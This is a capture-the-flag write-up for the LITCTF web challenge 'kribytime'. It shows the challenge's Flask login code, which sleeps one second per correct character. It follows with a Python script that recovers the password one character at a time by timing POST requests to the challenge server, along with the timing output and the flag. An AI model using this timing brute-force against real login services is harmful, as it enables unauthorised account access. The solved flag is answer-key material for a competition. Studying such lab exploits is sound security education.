# kribytime

Category: WEB

Points: 126

Solves: 212

>Welcome to Kirby's Website.


### Solution

Most obnoxious timing attack challenge:

```py
import sqlite3
from flask import Flask, request, redirect, render_template
import time
app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def login():
    message = None
    if request.method == 'POST':
        password = request.form['password']
        real = 'REDACTED'
        if len(password) != 7:
            return render_template('login.html', message="you need 7 chars")
        for i in range(len(password)):
            if password[i] != real[i]:
                message = "incorrect"
                return render_template('login.html', message=message)
            else:
                time.sleep(1)
        if password == real:
            message = "yayy! hi kirby"

    return render_template('login.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

Looks like it checks a length 7 password char by char, and if the char is correct it will wait for 1 second, otherwise it will fail. We can just bruteforce char by char and see when the response takes 1 second longer (May need to run multiple times since instance times out too fast :skull: just be sure to modify the password and range to skip already found chars, I also just guessed the last char instead of waiting :skull:):

```py
import requests
import string

password = ["x","x","x","x","x","x","x"]

for i in range(7):
    for char in string.ascii_letters:
        password[i] = char;
        data = {
            'password': ''.join(password),
        }
        response = requests.post('http://34.31.154.223:57719', data=data)
        print(response.elapsed.total_seconds(), char)
        if response.elapsed.total_seconds() > i+1:
            print(''.join(password))
            break
```

```py
...
0.182681 j
1.170158 k
kxxxxxx
1.176712 a
1.172837 b
...
1.183299 A
2.177066 B
kBxxxxx
2.183253 a
2.171713 b
...
2.253518 x
3.230859 y
kByxxxx
3.515871 a
3.192597 b
...
3.182717 R
4.265577 S
kBySxxx
4.227163 a
4.241624 b
...
4.268185 k
5.302939 l
kBySlxx
6.245504 a
kBySlax
6.245765 a
6.238724 b
...
6.339974 X
7.248733 Y
kBySlaY
```

### Flag

```LITCTF{kBySlaY}```